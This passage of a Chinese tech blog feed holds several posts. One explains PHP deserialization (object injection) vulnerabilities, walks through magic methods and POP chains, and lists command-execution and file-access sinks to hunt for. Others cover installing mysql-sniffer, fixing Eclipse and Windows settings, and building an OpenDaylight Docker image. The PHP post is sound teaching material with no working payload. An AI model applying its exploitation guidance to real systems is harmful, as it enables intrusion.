第N次执行步骤5，果然刚才的问题没有了，不过又出现了新的问题，提示缺少glibconfig.h头文件，如下（无奈.jpg） </p><p>   <img src="http://img.blog.csdn.net/20170609200325723?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuenQxMjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p><p>   (ps:我能怎么办，我也很绝望啊)</p><p>  这个问题花费的时间稍微多一点，解决办法也是在github看到的，原文地址：<a href="https://github.com/dusty-nv/jetson-inference/issues/6" target="_blank" rel="noopener"> https://github.com/dusty-nv/jetson-inference/issues/6</a></p><p>   执行 </p><pre><code>cp /usr/lib/x86_64-linux-gnu/glib-2.0/include/glibconfig.h /usr/include/glib-2.0/glibconfig.h   </code></pre><p>   即可。</p><p>   第N+1次执行步骤5，总算编译成功。</p><p>   接着执行安装步骤：</p><pre><code>make</code></pre><p>   到此安装其实已经结束了，我们可以通过下面的方法验证是否安装成功：</p><pre><code>cd bin./mysql-sniffer -h</code></pre><p>  若输出相应的使用帮助，则说明安装成功。Game Over！</p><p>   <img src="http://img.blog.csdn.net/20170609202036671?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuenQxMjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;偶然在github上看到了mysql抓包工具mysql-sniffer，出于好奇体验了一下，不过安装过程中遇到了几个坑，在此记录一下。&lt;/p&gt;
&lt;p&gt;   项目地址： &lt;a href=&quot;https://github.com/Qihoo360/mysql-sniffer&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/Qihoo360/mysql-sniffer&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="Kali Linux、mysql-sniffer" scheme="http://yoursite.com/tags/Kali-Linux%E3%80%81mysql-sniffer/"/>
    
  </entry>
  
  <entry>
    <title>Eclipse卸载Spring Tool Suite插件后无法启动</title>
    <link href="http://yoursite.com/2018/04/30/Eclipse%E5%8D%B8%E8%BD%BDSpring-Tool-Suite%E6%8F%92%E4%BB%B6%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8/"/>
    <id>http://yoursite.com/2018/04/30/Eclipse卸载Spring-Tool-Suite插件后无法启动/</id>
    <published>2018-04-29T17:41:32.000Z</published>
    <updated>2018-04-30T07:04:49.646Z</updated>
    
    <content type="html"><![CDATA[<p>###前段时间为了做课设给Eclipse安装了Spring Tool Suite插件，越来越觉得Eclipse装了太多插件启动有点慢，就把Spring Tool Suite插件卸载了，然后重启Eclipse，发现无法正常启动，以下为部分错误日志：</p><a id="more"></a><p>!ENTRY org.eclipse.osgi 4 0 2017-10-06 13:33:49.046<br>!MESSAGE Application error<br>!STACK 1<br>java.lang.RuntimeException: Application “” could not be found in the registry. The applications available are: org.eclipse.ant.core.antRunner, org.eclipse.ant.ui.antRunner, org.eclipse.datatools.connectivity.console.profile.StorageFileEditor, org.eclipse.e4.ui.workbench.swt.E4Application, org.eclipse.e4.ui.workbench.swt.GenTopic, org.eclipse.emf.codegen.CodeGen, org.eclipse.emf.codegen.JMerger, org.eclipse.emf.codegen.ecore.Generator, org.eclipse.emf.importer.ecore.Ecore2GenModel, org.eclipse.emf.importer.java.Java2GenModel, org.eclipse.emf.importer.rose.Rose2GenModel, org.eclipse.equinox.app.error, org.eclipse.equinox.p2.director, org.eclipse.equinox.p2.garbagecollector.application, org.eclipse.equinox.p2.publisher.InstallPublisher, org.eclipse.equinox.p2.publisher.EclipseGenerator, org.eclipse.equinox.p2.publisher.ProductPublisher, org.eclipse.equinox.p2.publisher.FeaturesAndBundlesPublisher, org.eclipse.equinox.p2.reconciler.application, org.eclipse.equinox.p2.repository.repo2runnable, org.eclipse.equinox.p2.repository.metadataverifier, org.eclipse.equinox.p2.artifact.repository.mirrorApplication, org.eclipse.equinox.p2.metadata.repository.mirrorApplication, org.eclipse.equinox.p2.touchpoint.natives.nativePackageExtractor, org.eclipse.equinox.p2.updatesite.UpdateSitePublisher, org.eclipse.equinox.p2.publisher.UpdateSitePublisher, org.eclipse.equinox.p2.publisher.CategoryPublisher, org.eclipse.help.base.infocenterApplication, org.eclipse.help.base.helpApplication, org.eclipse.help.base.indexTool, org.eclipse.jdt.apt.core.aptBuild, org.eclipse.jdt.core.JavaCodeFormatter, org.eclipse.jdt.core.JavaIndexer, org.eclipse.oomph.setup.core.SetupArchiver, org.eclipse.pde.build.Build, org.eclipse.pde.junit.runtime.uitestapplication, org.eclipse.pde.junit.runtime.legacytestapplication, org.eclipse.pde.junit.runtime.coretestapplication, org.eclipse.pde.junit.runtime.coretestapplicationnonmain, org.eclipse.pde.junit.runtime.nonuithreadtestapplication, org.eclipse.ui.ide.workbench, org.eclipse.wst.jsdt.core.JavaCodeFormatter, org.eclipse.wst.server.preview.preview.<br>at org.eclipse.equinox.internal.app.EclipseAppContainer.startDefaultApp(EclipseAppContainer.java:248)<br>at org.eclipse.equinox.internal.app.MainApplicationLauncher.run(MainApplicationLauncher.java:29)<br>at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.runApplication(EclipseAppLauncher.java:134)<br>at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.start(EclipseAppLauncher.java:104)<br>at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:388)<br>at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:243)<br>at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)<br>at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)<br>at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)<br>at java.lang.reflect.Method.invoke(Method.java:498)<br>at org.eclipse.equinox.launcher.Main.invokeFramework(Main.java:673)<br>at org.eclipse.equinox.launcher.Main.basicRun(Main.java:610)<br>at org.eclipse.equinox.launcher.Main.run(Main.java:1519)<br>at org.eclipse.equinox.launcher.Main.main(Main.java:1492)</p><p><br></p><h3 id="然后就在网上找解决这个问题的方法，还真找到了合适的方法，具体方法如下："><a href="#然后就在网上找解决这个问题的方法，还真找到了合适的方法，具体方法如下：" class="headerlink" title="然后就在网上找解决这个问题的方法，还真找到了合适的方法，具体方法如下："></a>然后就在网上找解决这个问题的方法，还真找到了合适的方法，具体方法如下：</h3><p>  eclipse所在目录/configuration/config.ini，</p><p>  看看config.ini中   eclipse.product  和   eclipse.application这两行等号后面是否为空，若为空，则将其改为如下：</p><pre><code>eclipse.product=org.eclipse.platform.ideeclipse.application=org.eclipse.ui.ide.workbench</code></pre><p>保存修改后，重新启动Eclipse，问题解决</p><p>  参考链接：   <a href="http://blog.csdn.net/qq_29439685/article/details/50606638?utm_source=itdadao&amp;utm_medium=referral" target="_blank" rel="noopener">http://blog.csdn.net/qq_29439685/article/details/50606638?utm_source=itdadao&amp;utm_medium=referral</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;###前段时间为了做课设给Eclipse安装了Spring Tool Suite插件，越来越觉得Eclipse装了太多插件启动有点慢，就把Spring Tool Suite插件卸载了，然后重启Eclipse，发现无法正常启动，以下为部分错误日志：&lt;/p&gt;
    
    </summary>
    
    
      <category term="Eclipse Spring" scheme="http://yoursite.com/tags/Eclipse-Spring/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞</title>
    <link href="http://yoursite.com/2018/04/30/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/04/30/PHP反序列化漏洞/</id>
    <published>2018-04-29T17:30:04.000Z</published>
    <updated>2018-04-30T07:07:17.846Z</updated>
    
    <content type="html"><![CDATA[<p>  一直以来总是觉得对PHP反序列化漏洞的理解比较模糊，今天抽时间深入学习下PHP反序列化漏洞的成因以及利用方式，在此做一个总结。</p><a id="more"></a><p>   参考链接：</p><pre><code>http://bobao.360.cn/learning/detail/3193.htmlhttp://blog.csdn.net/qq_32400847/article/details/53873275?readlog</code></pre><p>  PHP反序列化漏洞，也叫php对象注入（PHP Object Injection）。</p><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>   说到反序列化，就要提到序列化。序列化和反序列化的目的是使得程序间传输对象更加方便。序列化是将对象转换为字符串以便存储和传输的一种方式。而反序列化就是序列化的逆过程，它会将字符串重新转换为对象供程序使用。</p><p>   在PHP中序列化和反序列化对应的函数分别为serialize()和unserialize()。反序列化本身并不危险，但是如果反序列化时传入反序列化函数的参数是用户可控的，反序列化漏洞就产生了。</p><h2 id="PHP手册中关于对象序列化的描述："><a href="#PHP手册中关于对象序列化的描述：" class="headerlink" title="PHP手册中关于对象序列化的描述："></a>PHP手册中关于对象序列化的描述：</h2><pre><code>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示，unserialize()函数能够重新把字符串变回php原来的值。反序列化一个对象将会保存对象的所有变量。但是不会保存对象的方法，只会保存类的名字。  为了能够unserialize()一个对象，这个对象的类必须已经定义过。如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。如果要想在另外一个文件中解序列化一个对象，这个对象的类必须在解序列化之前定义，可以通过包含一个该类的文件或使用函数spl_autoload_register()来实现。</code></pre><h2 id="PHP中的magic方法（函数）："><a href="#PHP中的magic方法（函数）：" class="headerlink" title="PHP中的magic方法（函数）："></a>PHP中的magic方法（函数）：</h2><p>   魔术方法就是在某些条件下自动执行的函数。</p><p>   为什么会有魔术方法：</p><p>   魔术方法是在需要实现一些功能，但是一般代码做不到或很难做到的时候才能用。在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能。</p><p>   php类可能会包含一些特殊的函数叫magic方法，magic方法命名是以符号<strong>开头的，比如</strong>construct()、<strong>destruct()、</strong>toString()、<strong>sleep()、</strong>wakeup()等等，这些函数在某些情况下会自动调用。一些magic函数及其用途如下：</p><pre><code>__construct()         当一个对象创建时触发__destruct()          当一个对象被销毁时触发__toString()          把类当作字符串使用时触发__call()              在对象上下文中调用不可访问的方法时触发__callStatic()        在静态上下文中调用不可访问的方法时触发__get()               用于从不可访问的属性读取数据时__set()               用于将数据写入不可访问的属性__wakeup()            使用unserialize时触发__sleep()             使用serialize时触发__isset()             在不可访问的属性上调用isset()或empty()触发__unset()             在不可访问的属性上使用unset()时触发__invoke()            当脚本尝试将对象调用为函数时触发__autoload()          尝试加载未定义的类时触发__clone()             当对象复制完成时触发</code></pre><p><br><br>   配合代码讲解，更容易理解魔术方法怎么调用的：</p><p><br></p><pre><code> &lt;?phpclass Brucetg{ public $test = &quot;This is just a test&quot;; public function PrintTest() { echo $this-&gt;test.&apos;&lt;br/&gt;&apos;; } public function __construct() { echo &apos;__construct&lt;/br&gt;&apos;; } public function __destruct() { echo &apos;__destruct&lt;br /&gt;&apos;; } public function __toString() { return &apos;__toString&lt;br /&gt;&apos;; }} $object = new Brucetg(); $object-&gt;PrintTest(); echo $object;?&gt;</code></pre><p><br><br><img src="http://img.blog.csdn.net/20171102233601617?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuenQxMjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p><h2 id="为什么会有序列化和反序列化："><a href="#为什么会有序列化和反序列化：" class="headerlink" title="为什么会有序列化和反序列化："></a>为什么会有序列化和反序列化：</h2><p>   php允许保存一个对象方便以后使用，这个过程被称为序列化。为什么要有序列化这种机制呢？在传递变量的过程中，有可能遇到变量值要跨脚本文件传递的过程。试想，如果另一个脚本想要调用之前一个脚本的变量，但是前一个脚本已经执行完毕，所有的变量和内容已经释放掉了，我们要如何操作呢？难道要一个脚本不断地循环，等待后面脚本调用？这肯定是不现实的。serialize和unserialize就是用来解决这一问题的。serialize可以将变量转换为字符串并且在转换中可以保存当前变量的值；unserialize则可以将serialize生成的字符串转换为变量。</p><pre><code>// 1.php &lt;?phpclass User{public $name = &apos;&apos;;public $age = 0;public $sex = &apos;&apos;;public function PrintUser(){echo &apos;User &apos;.$this-&gt;name.&apos; is &apos; . $this-&gt;age .&apos; years old, sex is &apos;.$this-&gt;sex.&apos;.&lt;br/&gt;&apos;;}}//创建一个对象$user = new User();$user-&gt;name = &apos;Test&apos;;$user-&gt;age = 20;$user-&gt;sex = &apos;male&apos;;$user-&gt;PrintUser();echo serialize($user);?&gt;</code></pre><p><br><br><img src="http://img.blog.csdn.net/20171102233654885?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuenQxMjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p><p><br></p><p>为了使用这个对象，在2.php中用unserialize重建对象。</p><pre><code>//2.php   &lt;?php  class User{  public $age = 0;  public $name = &apos;&apos;;  public $sex = &apos;&apos;;  public function PrintUser()  {  echo &apos;User &apos; .$this-&gt;name.&apos; is &apos;.$this-&gt;age.&apos; years old, sex is &apos;.$this-&gt;sex.&apos;. &apos;;  }  }  $user = unserialize(&apos;O:4:&quot;User&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;Test&quot;;s:3:&quot;age&quot;;i:20;s:3:&quot;sex&quot;;s:4:&quot;male&quot;;}&apos;);  $user-&gt;PrintUser();  ?&gt;</code></pre><p>  <br></p><p>  <img src="http://img.blog.csdn.net/20171102233741309?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuenQxMjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p><p><br></p><p>  反序列化漏洞的利用思路：</p><p>   在反序列化中，我们所能控制的数据就是对象中的各个属性值，所以在PHP的反序列化有一种漏洞利用方法叫做“面向属性编程”，即POP（Property Oriented Programming）。和二进制漏洞中常用的ROP技术类似。在ROP技术中我们往往需要一段初始化gadgets来开始我们整个的利用过程，然后继续调用其他的gadgets。在PHP反序列化漏洞利用技术POP中，对应的初始化gadgets就是<strong>wakeup()或者是</strong>destruct()方法。在最理想的情况下能够实现漏洞利用的点就在这两个函数中，但往往我们需要从这个函数开始，逐步的跟进在这个函数中调用到的所有函数，直到找出可以利用的点为止。以下为跟进其函数调用过程中需要关注的一些很有价值的函数：</p><p>   Command Execution：</p><pre><code>exec()passthru()popen()system()</code></pre><p><br><br>   File Access:<br><br></p><pre><code>file_put_contents()file_get_contents()unlink()</code></pre><p>  当然并不只有这些函数才会导致漏洞的产生，比如前几天typecho反序列化漏洞最终利用的是call_user_function(),漏洞分析中也提到了array_map()函数，该函数在传递给它的参数是用户可控时也会导致漏洞的产生。</p><h3 id="POP：-简单来说就是关注整个函数的调用过程中参数的传递情况，找到可利用的点，这和一般的Web漏洞没什么区别，只是可控制的值由直接传递给程序的参数转变为了对象中的值。"><a href="#POP：-简单来说就是关注整个函数的调用过程中参数的传递情况，找到可利用的点，这和一般的Web漏洞没什么区别，只是可控制的值由直接传递给程序的参数转变为了对象中的值。" class="headerlink" title="POP： 简单来说就是关注整个函数的调用过程中参数的传递情况，找到可利用的点，这和一般的Web漏洞没什么区别，只是可控制的值由直接传递给程序的参数转变为了对象中的值。"></a>POP： 简单来说就是关注整个函数的调用过程中参数的传递情况，找到可利用的点，这和一般的Web漏洞没什么区别，只是可控制的值由直接传递给程序的参数转变为了对象中的值。</h3><p><br></p><h2 id="反序列化漏洞挖掘："><a href="#反序列化漏洞挖掘：" class="headerlink" title="反序列化漏洞挖掘："></a>反序列化漏洞挖掘：</h2><p><br></p><p>  PHP的unserialize()函数只能反序列化在当前程序上下文中已经被定义过的类。在传统的PHP中你需要通过使用一大串的include()或者require()来包含所需的类定义文件。于是后来出现了autoloading技术，它可以自动导入需要使用的类。这种技术同时也方便了我们的漏洞利用。因为在我们找到一个反序列化点的时候我们所有使用的类就多了，那么实现漏洞利用的可能性也就更高。</p><p>  还有一个东西要提一下，那就是Composer，这是一个php的包管理工具，同时他还能自动导入所依赖库中定义的类，这样一来unserialize()函数也就能使用所有依赖库中的类了，攻击面又增大不少。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;  一直以来总是觉得对PHP反序列化漏洞的理解比较模糊，今天抽时间深入学习下PHP反序列化漏洞的成因以及利用方式，在此做一个总结。&lt;/p&gt;
    
    </summary>
    
    
      <category term="PHP、反序列化" scheme="http://yoursite.com/tags/PHP%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>解决Win10运行记录不显示的问题</title>
    <link href="http://yoursite.com/2018/04/30/%E8%A7%A3%E5%86%B3Win10%E8%BF%90%E8%A1%8C%E8%AE%B0%E5%BD%95%E4%B8%8D%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>http://yoursite.com/2018/04/30/解决Win10运行记录不显示的问题/</id>
    <published>2018-04-29T17:16:52.000Z</published>
    <updated>2018-04-30T07:08:47.722Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Win10更新后，不小心改了某个选项，之后每次打开运行都需要重新输入命令，感觉比较麻烦："><a href="#1-Win10更新后，不小心改了某个选项，之后每次打开运行都需要重新输入命令，感觉比较麻烦：" class="headerlink" title="1. Win10更新后，不小心改了某个选项，之后每次打开运行都需要重新输入命令，感觉比较麻烦："></a>1. Win10更新后，不小心改了某个选项，之后每次打开运行都需要重新输入命令，感觉比较麻烦：</h2><a id="more"></a>  <p><br></p><p><img src="http://img.blog.csdn.net/20171128105400779?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuenQxMjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""><br><br><br><br>后来查找资料发现，是因为显示最常用的应用这一选项被关闭了 </p><p><br></p><p><img src="http://img.blog.csdn.net/20171128105626236?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuenQxMjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""></p><p><br></p><p>  但是显示最常用的应用这一选项是灰色的，无法点击，其实只要打开另一选项就可以了，方法如下：</p><p>  打开 设置-&gt;隐私-&gt;常规，将 允许Windows跟踪应用启动，以改进开始和搜索结果  这一选项设置为开</p><p><br></p><p>  <img src="http://img.blog.csdn.net/20171128110119701?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuenQxMjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""></p><p><br></p><p>然后再转到  设置-&gt;个性化-&gt;开始 界面中，可以看到显示最常用的应用这一选项已经变为可选（不再是灰色），将其设置为开即可</p><p><br></p><p><img src="http://img.blog.csdn.net/20171128110422910?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuenQxMjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-Win10更新后，不小心改了某个选项，之后每次打开运行都需要重新输入命令，感觉比较麻烦：&quot;&gt;&lt;a href=&quot;#1-Win10更新后，不小心改了某个选项，之后每次打开运行都需要重新输入命令，感觉比较麻烦：&quot; class=&quot;headerlink&quot; title=&quot;1. Win10更新后，不小心改了某个选项，之后每次打开运行都需要重新输入命令，感觉比较麻烦：&quot;&gt;&lt;/a&gt;1. Win10更新后，不小心改了某个选项，之后每次打开运行都需要重新输入命令，感觉比较麻烦：&lt;/h2&gt;
    
    </summary>
    
    
      <category term="Windows、cmd" scheme="http://yoursite.com/tags/Windows%E3%80%81cmd/"/>
    
  </entry>
  
  <entry>
    <title>Docker 部署 SDN（OpenDayLight）</title>
    <link href="http://yoursite.com/2018/04/29/Docker-%E9%83%A8%E7%BD%B2-SDN%EF%BC%88OpenDayLight%EF%BC%89/"/>
    <id>http://yoursite.com/2018/04/29/Docker-部署-SDN（OpenDayLight）/</id>
    <published>2018-04-29T15:43:18.000Z</published>
    <updated>2018-04-30T07:04:09.212Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-安装Docker，我的之前已经安装好了："><a href="#1-安装Docker，我的之前已经安装好了：" class="headerlink" title="1. 安装Docker，我的之前已经安装好了："></a>1. 安装Docker，我的之前已经安装好了：</h2><p>   安装软件包apt-transport-https，使APT系统能够被https解析</p><pre><code>sudo apt-get install apt-transport-https</code></pre><a id="more"></a><p>   添加Docker repository key到本地keychain</p><pre><code>sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 36A1D7869245C8950F966E92D8576A8BA88D21E9</code></pre><p>   添加docker软件仓库到软件源，升级软件源，安装lxc-docker包</p><pre><code>sudo sh -c &quot;echo deb https://get.docker.com/ubuntu docker main &gt; /etc/apt/sources.list.d/docker.list&quot;sudo apt-get updatesudo apt-get install lxc-docker</code></pre><h2 id="2-配置阿里云Docker镜像加速器"><a href="#2-配置阿里云Docker镜像加速器" class="headerlink" title="2. 配置阿里云Docker镜像加速器"></a>2. 配置阿里云Docker镜像加速器</h2><p>   由于某些原因国内下载镜像速度非常慢，慢到了无法忍受的地步，那就只好另寻它法了，这里我们采用阿里云提供的Docker镜像加速器。</p><p>   浏览器访问：<a href="https://dev.aliyun.com/search.html" target="_blank" rel="noopener">https://dev.aliyun.com/search.html</a>，打开 开发者平台 – 管理中心 – 镜像加速器 。可以看到 “您的专属加速器地址” 即 <a href="https://xxxxxxx.mirror.aliyuncs.com" target="_blank" rel="noopener">https://xxxxxxx.mirror.aliyuncs.com</a> 。</p><p>   如下图所示：<br>    <img src="https://s1.ax1x.com/2018/04/30/CGYaM4.png" alt=""></p><p>   按提示配置即可，速度比之前快的不要不要的。</p><h2 id="3-下载镜像到本地（Ubuntu-14-04）"><a href="#3-下载镜像到本地（Ubuntu-14-04）" class="headerlink" title="3.下载镜像到本地（Ubuntu 14.04）:"></a>3.下载镜像到本地（Ubuntu 14.04）:</h2><pre><code>sudo docker pull ubuntu:14.04</code></pre><p>   启动Ubuntu 14.04：</p><pre><code>sudo docker run -i -t ubuntu:14.04 /bin/bash</code></pre><p>创建的Docker镜像如果不包含ifconfig、netstat等工具，需要自行安装，执行以下命令安装即可（在docker镜像中执行）：</p><pre><code>apt-get updateapt-get install net-tools</code></pre><h2 id="4-安装基本依赖："><a href="#4-安装基本依赖：" class="headerlink" title="4.安装基本依赖："></a>4.安装基本依赖：</h2><p> 安装git：  </p><pre><code>apt-get install git</code></pre><p> 安装wget：</p><pre><code>apt-get install wget</code></pre><p>安装Oracle JDK（OpenDaylight 使用Java语言开发）：</p><pre><code>wget http://download.oracle.com/otn-pub/java/jdk/8u151-b12/e758a0de34e24606bca991d704f6dcbf/jdk-8u151-linux-x64.tar.gz?AuthParam=1514528589_ce87a553f807b80cb2ef418629984734</code></pre><p>（注：上述URL中AuthParam每次均会改变，如果不能下载请自行去官网获取最新链接）</p><pre><code>ls -al</code></pre><p> <img src="https://s1.ax1x.com/2018/04/30/CGY7Jf.png" alt=""></p><p>将文件重命名：</p><pre><code>mv jdk-8u151-linux-x64.tar.gz? AuthParam=1514528589_ce87a553f807b80cb2ef418629984734 jdk-8u151-linux-x64.tar.gz</code></pre><p>  解压：</p><pre><code>tar -zxvf  jdk-8u151-linux-x64.tar.gz</code></pre><p>  将其移动到 /usr目录下，方便管理</p><pre><code>mv jdk1.8.0_151 /usr/jdk1.8.0_151</code></pre><p>  安装vim：  </p><pre><code>apt-get install vim</code></pre><p>  编辑 .bashrc  ：</p><pre><code>vim ~/.bashrc</code></pre><p>  在尾部添加如下：</p><pre><code>JAVA_HOME=/usr/jdk1.8.0_151JRE_HOME=$JAVA_HOME/jreJAVA_BIN=$JAVA_HOME/binCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libPATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binexport JAVA_HOME JRE_HOME PATH CLASSPATH</code></pre><p>  为了使配置生效，执行   </p><pre><code>source ~/.bashrc</code></pre><p>  验证JDK是否安装成功： </p><pre><code>java -version</code></pre><p>  <img src="https://s1.ax1x.com/2018/04/30/CGYqSS.png" alt=""></p><h2 id="5-安装Maven（OpenDaylight-使用Maven进行包管理，并且要求Maven3-1-1版本以上）："><a href="#5-安装Maven（OpenDaylight-使用Maven进行包管理，并且要求Maven3-1-1版本以上）：" class="headerlink" title="5.安装Maven（OpenDaylight 使用Maven进行包管理，并且要求Maven3.1.1版本以上）："></a>5.安装Maven（OpenDaylight 使用Maven进行包管理，并且要求Maven3.1.1版本以上）：</h2><pre><code>wget http://ftp.wayne.edu/apache/maven/maven-3/3.5.2/binaries/apache-maven-3.5.2-bin.tar.gztar zxvf apache-maven-3.5.2-bin.tar.gzmv apache-maven-3.5.2 /usr/apache-maven-3.5.2</code></pre><hr><pre><code>vim ~/.bashrc</code></pre><p>  在末尾追加：</p><pre><code>export MAVEN_HOME=/usr/apache-maven-3.5.2export PATH=${PATH}:${MAVEN_HOME}/bin</code></pre><p>  保存后，执行  </p><pre><code>source ~/.bashrc</code></pre><p>  即可。</p><p>  查看是否安装成功：</p><pre><code>mvn -version</code></pre><p>  <img src="https://s1.ax1x.com/2018/04/30/CGt9YV.png" alt=""></p><p>  克隆项目：</p><pre><code>git clone https://github.com/sdnhub/SDNHub_Opendaylight_Tutorial.git</code></pre><p>  切换到项目目录：</p><pre><code>cd SDNHub_Opendaylight_Tutorial</code></pre><p>  开始编译：</p><pre><code>mvn install -nsu</code></pre><p>  报错：</p><p>  <img src="https://s1.ax1x.com/2018/04/30/CGtFlF.png" alt=""></p><p>  解决方案：</p><pre><code>wget -q -O - https://raw.githubusercontent.com/opendaylight/odlparent/master/settings.xml &gt; ~/.m2/settings.xml</code></pre><p>  重新编译：  </p><pre><code>mvn install -nsu</code></pre><p>  安装成功：</p><p>  <img src="https://s1.ax1x.com/2018/04/30/CGtAOJ.md.png" alt=""></p><h2 id="6-将制作好的容器打包成Docker镜像，并提交到Docker-Hub"><a href="#6-将制作好的容器打包成Docker镜像，并提交到Docker-Hub" class="headerlink" title="6.将制作好的容器打包成Docker镜像，并提交到Docker Hub"></a>6.将制作好的容器打包成Docker镜像，并提交到Docker Hub</h2><p>  查看所有容器：</p><pre><code>sudo docker ps -asudo docker commit d20d057bdfda sdn_opendaylight:1.0</code></pre><p>  （注： commit后跟的是容器id）</p><p>  查看镜像：  </p><pre><code>sudo docker images</code></pre><p>  <img src="https://s1.ax1x.com/2018/04/30/CGtVm9.png" alt=""></p><p>  镜像提交到Docker Hub，需提前申请DockerHub账号：‘</p><p>  給存在于本地的镜像打标签，要带上dockerhub 用户名（如果最后不带冒号加版本，就默认为 :lastest版本）</p><pre><code>sudo docker tag sdn_opendaylight:1.0 brucetg/sdn_opendaylight</code></pre><p>  登陆DockerHub</p><pre><code>sudo docker login</code></pre><p>  输入正确的用户名和密码即可。</p><p>  提交到 DockerHub：</p><pre><code>sudo docker push brucetg/sdn_opendaylight</code></pre><h2 id=""><a href="#" class="headerlink" title="  "></a>  <img src="https://s1.ax1x.com/2018/04/30/CGteT1.png" alt=""></h2><p>  <img src="https://s1.ax1x.com/2018/04/30/CGtuY6.png" alt=""></p><p>  启动：（在SDNHub_Opendaylight_Tutorial目录中执行以下命令）</p><pre><code>cd distribution/opendaylight-karaf/target/assembly./bin/karaf</code></pre><p>  <img src="https://s1.ax1x.com/2018/04/30/CGtKfK.md.png" alt=""></p><hr><p>  <img src="https://s1.ax1x.com/2018/04/30/CGtQSO.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-安装Docker，我的之前已经安装好了：&quot;&gt;&lt;a href=&quot;#1-安装Docker，我的之前已经安装好了：&quot; class=&quot;headerlink&quot; title=&quot;1. 安装Docker，我的之前已经安装好了：&quot;&gt;&lt;/a&gt;1. 安装Docker，我的之前已经安装好了：&lt;/h2&gt;&lt;p&gt;   安装软件包apt-transport-https，使APT系统能够被https解析&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get install apt-transport-https
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="Docker、SDN" scheme="http://yoursite.com/tags/Docker%E3%80%81SDN/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2018/04/27/hello-world/"/>
    <id>http://yoursite.com/2018/04/27/hello-world/</id>
    <published>2018-04-27T15:59:14.234Z</published>
    <updated>2018-04-30T07:05:20.924Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 